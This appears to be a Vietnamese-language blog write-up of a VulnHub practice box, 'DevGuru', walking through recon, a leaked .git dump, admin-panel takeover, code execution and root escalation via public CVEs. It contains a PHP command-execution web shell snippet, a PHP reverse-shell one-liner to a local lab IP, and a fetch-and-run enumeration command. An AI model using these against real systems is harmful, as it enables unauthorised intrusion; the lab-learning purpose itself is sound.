---
title: "Pentesting Diary - Hack with Me: [4] Dev Guru"
published: 2022-05-29   
description: ''
image: ''
tags: [Writeup,"Pentesting Diary: Hack with Me"]
category: 'Cybersecurity'
draft: false 
lang: 'en'
---
# Dev Guru

BOX: Dev Guru

Link: [https://www.vulnhub.com/entry/devguru-1,620/](https://www.vulnhub.com/entry/devguru-1,620/)

## **TO DO:**

- [x]  Info gathering. Nmap, naabu, nuclei.
- [x]  Exploit:
    - [x]  Dump .git
    - [x]  Login /admin page
    - [x]  Shell uploaded
    - [x]  Get Shell
- [x]  Privilege escalation
- [x]  REPORT
- [x]  Done!

# Information Gathering

## Port scanning:

Box này nó cho sẵn IP cho nên việc đầu tiên mình làm là scan port bằng naabu và nmap.

![Untitled](Untitled.png)

![Untitled](Untitled%201.png)

Nhìn vào kết quả trên có thể thấy được trang này bị git leak.

Và có port 8585 chạy GitTea.

![Untitled](Untitled%202.png)

## **Map VLAN**

![Untitled](Untitled%203.png)

## Vulns check

Sau đó mình dùng nuclei để tìm thêm các lỗ hổng,misconfig, CVE ,….  và thấy có CVE-2018-15473. 

![Untitled](Untitled%204.png)

![Untitled](Untitled%205.png)

## Fuzzing Time

### **Subdomain:**

**Passive:** 

![Untitled](Untitled%206.png)

**Active:** 

![Untitled](Untitled%207.png)

### Hidden directory:

![Untitled](Untitled%208.png)

Mình được các trang như sau :

![Untitled](Untitled%209.png)

Trang này thoạt nhìn trông như trang đăng nhập quản lý Database nên mình đã google thử thì biết được Adminer là Database Management trong PHP.  Tìm thử xem có CVE nào liên quan đến cái này không.

![Untitled](Untitled%2010.png)

Lên CVE detail tìm thử thì nó dính CVE 2021-21311 . Đại khái CVE như thế này. “**Adminer từ phiên bản 4.0.0 và trước 4.7.9 có lỗ hổng giả mạo yêu cầu phía máy chủ(SSRF). Người dùng các phiên bản Adminer gói tất cả các trình điều khiển (ví dụ: ``adminer.php``) đều bị ảnh hưởng. Điều này đã được khắc phục trong phiên bản 4.7.9.”** mà trang của chúng ta đang sử dụng ở phiên bản 4.7.7 

⇒ Trang /adminer.php này dính SSRF. 

![Untitled](Untitled%2011.png)

Link CVE: [https://www.cvedetails.com/cve/CVE-2021-21311/](https://www.cvedetails.com/cve/CVE-2021-21311/)

Tiếp theo là trang `/backend`

![Untitled](Untitled%2012.png)

Dùng Wappalyzer detect thử thì trang này là sử dụng October CMS.

![Untitled](Untitled%2013.png)

Mình thử tìm CVE của CMS này nhưng không có. 

## **Tổng kết những thông tin useful sau khi scan,fuzzing các kiểu con đà điểu nè:**

| **Scanning** | **PORT** | **Services** | **Version** | **Vuln** | **Exploitable?** | **Note** |
| --- | --- | --- | --- | --- | --- | --- |
| **Naabu  + Nmap**  | 80 | Apache httpd | 2.4.29 | Git leaks | Yes | Khai thác GitLeaks lấy được username/password database  |
|  | 22 | OpenSSH | 7.6p1 |  | Yes |  |
|  | 8585 | GitTea |  |  |  |  |
| **Nuclei** | 22 | OpenSSH | 7.6p1 | CVE-2018-15473  | Yes | enum được username ssh(sẽ tìm hiểu exploit ssh sau) |
| **Fuzzing**  | **PORT** | **File/Directory - Domain** |  |  |  |  |
| **Dirsearch** | 80 | `/adminer.php` | Adminer 4.7.7 |  CVE 2021-21311 | Yes |  |
|  | 80 | `/backend`October CMS 1.0.1 |  |  | Yes |  |
| **Subfinder** |  |  |  |  |  | nothing useful |
| **Knock** |  |  |  |  |  | nothing useful |

# **Exploit:**

## **Foothold**

Dùng Githacker để dump source code từ .git 

![Untitled](Untitled%2014.png)

Sau đó đọc từng file xem thử có gì useful không.

![Untitled](Untitled%2015.png)

## S**ource code review time : ON**

![Untitled](Untitled%2016.png)

Mình tìm thấy user/password để login mysql trong file `database.php`

![Untitled](Untitled%2017.png)

Sử dụng nó để đăng nhập vào trang `/adminer.php`

![Untitled](Untitled%2018.png)

Update password của user Frank để đăng nhập vào trang `/backend`

![Untitled](Untitled%2019.png)

Đăng nhập thành công trang `/backend`

![Untitled](Untitled%2020.png)

Theo kinh nghiệm của mình thì khi gặp các admin dashboard như này thì việc đầu tiên là check xem có chức năng upload không, nếu có thì tìm cách up shell(bypass filter nếu có). Và mình đã thử từ đổi đuôi - đổi MIME đổi - filesignature , up .htacesss nhưng tất cả đều bị chặn. Vậy là hết cách rồi sao ??? 

![Untitled](Untitled%2021.png)

Sau khi tìm hiểu thêm thì mình biết được chúng ta có thể thêm code PHP vào trang này thông qua chức năng gọi là ‘CMS’. 

![Untitled](Untitled%2022.png)

![Untitled](Untitled%2023.png)

Link docs: [https://docs.octobercms.com/2.x/cms/pages.html#page-variables](https://docs.octobercms.com/2.x/cms/pages.html#page-variables)

Lúc này trong đầu mình tự đặt ra câu hỏi `“Vậy sẽ ra sao nếu nhúng vào trang này một đoạn code thực thi cmd thông qua biến GET và trả về kết quả??”`

Mình có đoạn code như sau: 

```php
function onStart(){
	echo(system($_GET('cmd')));
}
```

![Untitled](Untitled%2024.png)

Và đây là kết quả: 

![Untitled](Untitled%2025.png)

Oh Yeah! It’s time to RCE. 

Ở đây mình sử dụng 1 con PHP reverse shell.

```php
php -r '$sock=fsockopen("10.10.1.18",3000);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Mình sẽ URL encode lại và sử dụng lệnh curl để thực thi

![Untitled](Untitled%2026.png)

Access granted!

Mình đã RCE thành công.

# Privilege Escapsulation:

## Enum:

Dùng Tool lse.h để enum system.

lse.h one line: `bash <(wget -q -O - "[https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh](https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh)") -l2 -i`

![Untitled](Untitled%2027.png)

## Exploit:

Ta thấy server này có tận 2 CVE có thể leo root, vậy mình sẽ thử khai thác theo cả 2 cách:

**CVE-2021-3156:**  Các Sudo phiên bản trước 1.9.5p2 bị lỗi Off-by-One( một loại BOF), dẫn dến cho phép chuyển đặc quyền lên root thông qua "sudoedit -s" và đối số dòng lệnh kết thúc bằng một ký tự dấu gạch chéo ngược.

Link CVE: [https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2021-3156](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2021-3156)

Link Exploit: [https://github.com/worawit/CVE-2021-3156](https://github.com/worawit/CVE-2021-3156)

![Untitled](Untitled%2028.png)

**CVE-2021-4034:** lỗ hổng này liên quan tới Polkit pkexec có thể khai thác leo thang đặc quyền.

Link CVE: [https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2021-4034](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2021-4034)

Link Exploit: [https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

![Untitled](Untitled%2029.png)

Có thể exploit CVE này bằng Pwnkit

![Untitled](Untitled%2030.png)

![Untitled](Untitled%2031.png)

![Untitled](Untitled%2032.png)

![Untitled](Untitled%2033.png)

# In another stage

Sau khi có được root thì game over rồi nhưng mình muốn khai thác sâu hơn vào hệ thống để tìm ra các lỗ hổng khác. 

Đầu tiên đọc thử file `/etc/passwd`

![Untitled](Untitled%2034.png)

Thì mình thấy trên máy này có user tên là frank . Vậy giờ mình login bằng user này xem thử có gì hay ho không. Đầu tiên mình sẽ đổi password user frank bằng lệnh sau: `echo “123450\n123450” | passwd frank`

![Untitled](Untitled%2035.png)

Sau đó mình sẽ thực hiện login bằng user frank

Đầu tiên là mình sẽ xem thử folder backups (mình có xem các folder khác nhưng không tìm thấy cái gì useful nên mình tập trung focus vào folder này nhe)

Thì đúng như cái tên của nó folder này chuyên dùng để backup dữ liệu lại.

Mình tìm được file `app.ini.bak`

![Untitled](Untitled%2036.png)

Trong file `app.ini.bak` có chứa password của dịch vụ gitTea .

Dùng username password này login vào trang `adminer.php` thử (theo suy đoán của mình đây là account database của trang GitTea mà mình đã tìm ra ở port 8585) 

![Untitled](Untitled%2037.png)

![Untitled](Untitled%2038.png)

![Untitled](Untitled%2039.png)

Mình sẽ tìm bảng user và clone 1 account .

![Untitled](Untitled%2040.png)

Nhưng ở đây password được hash bằng pbkdf2 nên mình thay đổi thành bcrypt cho dễ.

![Untitled](Untitled%2041.png)

![Untitled](Untitled%2042.png)

Đăng nhập thành công với account mình vừa clone.

![Untitled](Untitled%2043.png)

Vào xem config thử

![Untitled](Untitled%2044.png)

Ta có thể thấy GitTea version 1.12.5 . Search google thì thấy ver này của GitTea dính lỗi RCE thông qua chức năng GitHook.

CVE: [https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/](https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/)

Do trong database vẫn còn 1 user có tên là frank nên mình tìm thử user frank và thấy được 1 repo như này:

![Untitled](Untitled%2045.png)

Xong mình fork repo về và thêm python reverseshell vào GitHooks

![Untitled](Untitled%2046.png)

Sau đó mình update repo.

![Untitled](Untitled%2047.png)

***Ta da!*** 

![Untitled](Untitled%2048.png)

## Privilege Escapsulation again:

Kiểm tra quyền sudo và thấy user frank này có thể chạy sqlite3 với quyền root mặc định

![Untitled](Untitled%2049.png)

Exploit: [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

[https://gtfobins.github.io/gtfobins/sqlite3](https://gtfobins.github.io/gtfobins/sqlite3/)

![Untitled](Untitled%2050.png)

# Now you pwned everything!!! It’s your time to play with the victim.

# End game!!!

# PS:

Nguồn tham khảo các CVE: 

 [https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/](https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/)